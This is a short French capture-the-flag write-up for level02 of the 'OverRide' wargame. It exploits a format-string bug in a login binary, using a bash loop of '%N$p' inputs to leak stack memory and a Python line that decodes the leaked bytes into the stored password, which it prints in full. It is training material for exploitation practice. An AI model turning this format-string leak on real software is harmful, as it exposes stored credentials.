# Override
Override 42 security level 2

On observe un executable attendant un mot de passe et un login:
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: hhh
--[ Password: hhh
*****************************************
hhh does not have access!
```

On voit aussi qu'il print en utilisant printf ce qu'on lui rentre en argument.
Essayons une format string attack afin de voir si l'on peut lui faire ecrire ce que l'on souhaite car le mot de passe est stocké sur la stack.
Afin d'éviter de calculer la position du premier octet de pass, nous allons boucler jusqu'à trouver des valeurs nous interessants (On sait qu'il faut 5 octets interessants enchainé car notre pass fait 40 char donc 5 octets).

```
for x in {0..32}; do python -c "print '%$x\$p'" | ./level02 | grep 'access!'; done
0x756e505234376848 does not have access!
0x45414a3561733951 does not have access!
0x377a7143574e6758 does not have access!
0x354a35686e475873 does not have access!
0x48336750664b394d does not have access!

python -c "print ''.join([v.decode('hex')[::-1] for v in ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']])"
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
